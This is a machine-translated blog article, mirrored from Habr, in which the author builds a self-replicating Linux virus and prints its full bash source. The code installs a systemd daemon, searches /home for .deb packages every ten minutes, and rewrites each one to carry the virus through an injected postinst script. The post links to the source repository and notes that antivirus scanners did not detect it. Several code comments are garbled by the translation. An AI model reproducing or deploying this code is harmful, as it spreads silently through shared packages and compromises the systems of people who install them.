<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Trojan Penguin: Making a Virus for Linux</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="No, I am not going to tell you how to write your extortionist coder, miner, or exploit a super-new vulnerability, as you might think. And the more so,...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Trojan Penguin: Making a Virus for Linux</h1><div class="post__text post__text-html js-mediator-article">  No, I am not going to tell you how to write your extortionist coder, miner, or exploit a super-new vulnerability, as you might think.  And the more so, I don‚Äôt have a desire to raise the holivar ‚ÄúIs Linux safer than Windows? (Yes)‚Äù.  My goal was to write a simple virus for linux, there is no one, so to speak, ‚ÄúJust for Fun‚Äù, the only function of which is to distribute its copy.  That I succeeded, I will tell in this article.  At the end, I‚Äôll provide a link to GitHub with the sources. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/f5e/05a/703/f5e05a7031834bc8fb94b82b25429f68.jpg" alt="image"><br><a name="habracut"></a><br><h4>  Disclaimer </h4><br>  This article is written for informational purposes only.  In no case does the author urge readers to violate the laws of the Russian Federation.  Please do not repeat the actions described in this article without first reading Chapter 28 of the Criminal Code of the Russian Federation. <br><br><h4>  And what are we actually going to do? </h4><br>  The easiest way to implement the virus propagation mechanism for me seemed to be propagation through modified deb / rpm packages.  Deb and rpm packages are now the most popular distribution tool for Linux.  I opted for the deb format, since the number of users of Debian-based distributions prevails over Red Hat users and its ‚Äúfollowers‚Äù. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      It is also necessary that the virus automatically start up, and after each certain period of time scan the computer in search of deb-packages.  For debugging convenience, I chose a period of 10 minutes. <br><br><h4>  What is a deb package? </h4><br>  A deb package is a <a href="https://ru.wikipedia.org/wiki/Ar_(Unix)">.ar</a> archive that does not use compression.  There are three more files inside the archive: <i>debian-bynary</i> , <i>control.tar</i> and <i>data.tar</i> <br><br>  <i>debian.binary</i> is a text file containing the version of the deb-package format, at the moment there is always written "2.0". <br><br>  <i>control.tar</i> - archive with files containing information about the package (for example, the required control file) and packages necessary for installing the package (for example, preinst, postinst, prerm and postrm scripts that are run before / after installing / uninstalling the package).  It can be compressed with gzip or xz, in which case the extension .gz or .xz is added to the archive name, respectively. <br><br>  <i>data.tar</i> - archive with directories containing installable files.  Directories are represented by a tree in which they must be extracted to the root of the file system.  Can be compressed with gzip, bzip2, lzma, xz. <br><br>  We need to pay attention to the control file from the control.tar archive.  This file contains information about the package, such as the author, description, version, package priority in the system, etc. I am interested in the <i>depends</i> field, in which the dependencies are indicated (packages without which this package cannot work).  In this field, our virus will add <i>fakeroot</i> and <i>dpkg</i> - utilities that will be needed when modifying other packages on the infected computer. <br><br>  To build a deb package, a package root directory is created.  It contains directories with installed files and a DEBIAN directory containing service files, including control and installation / uninstall scripts.  Then the <i>fakeroot dpkg-deb --build ./path command is executed</i> . <br><br><h4>  First there was a demon </h4><br>  At the time of writing the virus, I still didn‚Äôt have a good idea of ‚Äã‚Äãwhat <a href="https://ru.wikipedia.org/wiki/Cron">Cron was</a> , and so I went by writing my own demon for <a href="https://ru.wikipedia.org/wiki/Systemd">systemd</a> .  I created the file trojan_penguin.service, which will be placed in the / lib / systemd / system directory, and added the following to it: <br><br><pre><code class="bash hljs">[Unit] Description = XXX [Service] ExecStart=/usr/bin/trojan_penguin.sh Type=fork [Install] WantedBy=multi-user.target</code> </pre> <br>  <i>ExecStart = / usr / bin / trojan_penguin.sh</i> - here I indicated the path to the file (to the future virus), which should be launched at system startup. <br><br>  <i>Type = fork</i> - this line indicates that the process must branch from the parent process. <br>  I did not see the need for a PID file, so I did not add it. <br><blockquote>  In the manuals for writing your daemon, the .service files are suggested to be placed in the / usr / lib / systemd / system / or / etc / systemd / system / directories.  But I found the / lib / systemd / system directory in my ubunt.  (I got apache2.service there).  Maybe someone will write in the comments, what this directory is for, and how it differs from the other two. </blockquote><br>  I got the file <i>/usr/bin/trojan_penguin.sh</i> like this: <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#!/bin/bash #debug=".../Programming/projects/TrojanPenguin" debug="" #    ,    if ! [ -d $debug/var/log/trojan_penguin/ ]; then mkdir $debug/var/log/trojan_penguin fi #   , #   10  while [ 1 ] do list=$(find /home -name "*.deb") # deb- #        for line in $list do $debug/usr/bin/tp_infect.sh $line &gt;&gt; $debug/var/log/trojan_penguin/log # ,  ,      log done date &gt; $debug/var/log/trojan_penguin/last_start #     (     ) sleep 600 # (60 * 10  = 10 ) done</span></span></code> </pre><br>  We are looking for deb-packages in the / home section (and where else can we find them?), Write the paths to the found files to the <i>list</i> variable.  Then we simply loop through all the lines from line and for each file we run the tp_infect.sh script, which will infect this file.  When I wrote a virus, the scripts were in a separate directory, and for convenience, I created a <i>debug</i> variable in which I registered the path to this folder. <br><br>  The demon is ready, it remains to learn how to run it at system startup.  For this, I wrote a <i>postinstall</i> script.  It will be launched immediately after the installation of the infected package and indicate that our virus runs with the system.  I placed it in the "/ usr / bin /" directory to copy it into infected packages from there. <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#!/bin/bash #debug="/home/dima/Dropbox/Programming/projects/TrojanPenguin/TrojanPenguin" debug="" systemctl daemon-reload #  ,           systemctl enable trojan_penguin.service #     systemctl start trojan_penguin.service # </span></span></code> </pre><br><h4>  Modifying the deb package </h4><br>  As I wrote above, the archives contained in the deb-package may have different permissions.  I did not bother, and only considered the case when the archives are compressed using .xz.  The file <i>/usr/bin/tp_infect.sh</i> , which is responsible for the modification, received the following content: <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#!/bin/bash #debug=".../Programming/projects/TrojanPenguin" debug="" temp="$debug/tmp/trojan_penguin" #   mkdir $temp mkdir $temp/new mkdir $temp/new/DEBIAN #  ar -p $1 data.tar.xz | tar -xJ -C $temp/new ar -p $1 control.tar.xz | tar -xJ -C $temp/new/DEBIAN/ # control #  control     "Deepends",    "Deepends",   ,     . cp $temp/new/DEBIAN/control $temp/orig_control cat $temp/orig_control | grep --before-context=100 Depends | grep -v Depends &gt; $temp/new/DEBIAN/control cat $temp/orig_control | grep Depends | tr -d '\r\n' &gt;&gt; $temp/new/DEBIAN/control echo ", fakeroot, python" &gt;&gt; $temp/new/DEBIAN/control cat $temp/orig_control | grep --after-context=100 Depends | grep -v Depends &gt;&gt; $temp/new/DEBIAN/control #    cp $debug/usr/bin/tp_postinst.sh $temp/new/DEBIAN/postinst #     ,    if ! [ -d $temp/new/usr ]; then mkdir $temp/new/usr fi if ! [ -d $temp/new/usr/bin ]; then mkdir $temp/new/usr/bin fi if ! [ -d $temp/new/lib ]; then mkdir $temp/new/lib fi if ! [ -d $temp/new/lib/systemd ]; then mkdir $temp/new/lib/systemd fi if ! [ -d $temp/new/lib/systemd/system ]; then mkdir $temp/new/lib/systemd/system fi #   cp $debug/usr/bin/trojan_penguin.sh $temp/new/usr/bin/trojan_penguin.sh cp $debug/usr/bin/tp_infect.sh $temp/new/usr/bin/tp_infect.sh cp $debug/usr/bin/tp_postinst.sh $temp/new/usr/bin/tp_postinst.sh cp $debug/lib/systemd/system/trojan_penguin.service $temp/new/lib/systemd/system/ # ,        ,    . fakeroot dpkg-deb --build $temp/new cp $temp/new.deb $1 rm -R $temp</span></span></code> </pre><br><h4>  Problems with postinstall </h4><br>  Everything is good, but now we have a problem.  And what if the package already has a postinstal?  The original postinstal can be written in different languages ‚Äã‚Äã(python, bash ...), it can even be a binary.  This will not allow us to simply add and add our postinstall to it.  I solved this problem as follows: <br><br>  Added such a thing to the <i>tp_infect.sh</i> script: <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#,     postinstal.  ,      . if [ -f $temp/new/usr/bin/postinst ]; then cp $temp/new/DEBIAN/postinst $debug/usr/bin/tp_orig_postinst fi</span></span></code> </pre><br>  And in <i>postinstal</i> this: <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#      if [ -f $debug/usr/bin/tp_orig_postinst ]; then $debug/usr/bin/tp_orig_postinst rm $debug/usr/bin/tp_orig_postinst fi</span></span></code> </pre><br>  I solved one problem, but another one appeared.  Our virus will modify the package even if it is already infected.  When modified, the virus will see that the package has a <i>postinstal</i> (which is actually ours), will move it to / usr / bin /, thereby overwriting the original.  To avoid this, I added a check in ‚Äútp_infect.sh‚Äù, whether we modified this file or not: <br><br><pre> <code class="bash hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> [ -f <span class="hljs-variable"><span class="hljs-variable">$temp</span></span>/new/usr/bin/trojan_penguin.sh ]; <span class="hljs-keyword"><span class="hljs-keyword">then</span></span> rm -R <span class="hljs-variable"><span class="hljs-variable">$temp</span></span> <span class="hljs-built_in"><span class="hljs-built_in">exit</span></span> 0 <span class="hljs-keyword"><span class="hljs-keyword">fi</span></span></code> </pre><br><h4>  Putting it together </h4><br>  The virus is ready.  Here is a <a href="https://github.com/dvoropaev/TrojanPenguin">link to GitHub</a> , as promised.  This virus can be compiled into a separate deb-package (run makedeb.sh) from the repository.  To inject a virus into a package, just run the command: <br><br><pre> <code class="bash hljs">tp_infect.sh /  deb-/</code> </pre><br>  There are two copies of the <i>postinst</i> script in the repository. <br><br>  <i>DEBIAN / postinst</i> - this copy is only performed when installing an empty virus package.  I commented it out so that the virus does not start after installation, and modifies the packages only on command. <br><br>  <i>usr / bin / postinst</i> - this copy is inserted into infectable packages. <br><br><h4>  Total </h4><br>  And the conclusion is obvious without this article: you should not download and run programs from unverified sources. <br><br>  For the sake of curiosity, I sent a deb-package with a virus to VirusTotal for analysis.  At the time of this writing, no antivirus has detected it.  Here is the <a href="https://www.virustotal.com/">link</a> to the report.  I wonder how much time must pass, and how many hosts need to infect with this virus in order for antiviruses to pay attention to it? </div><p>Source: <a href="https://habr.com/ru/post/430460/">https://habr.com/ru/post/430460/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../430450/index.html">Development model on the example of Stack-based CPU</a></li>
<li><a href="../430452/index.html">Fire, water and fine spray. How will the inhabitants and visitors of Lakhta Center be protected from fire?</a></li>
<li><a href="../430454/index.html">I'm surrounded by idiots or how to work in a team</a></li>
<li><a href="../430456/index.html">Legal PMI Project Management Books</a></li>
<li><a href="../430458/index.html">Multilayer Graphene Superconductor: Study of Flat Zones</a></li>
<li><a href="../430462/index.html">In Russia, there was a bill to provide users of social networks to an unlimited circle of people. Social networks against</a></li>
<li><a href="../430466/index.html">Mini AI Cup # 3: Writing a Top Bot</a></li>
<li><a href="../430468/index.html">We raise citizens' consciousness</a></li>
<li><a href="../430470/index.html">Why keeping the context on the client's account is fair and profitable</a></li>
<li><a href="../430472/index.html">Seamless DECT-network do it yourself</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>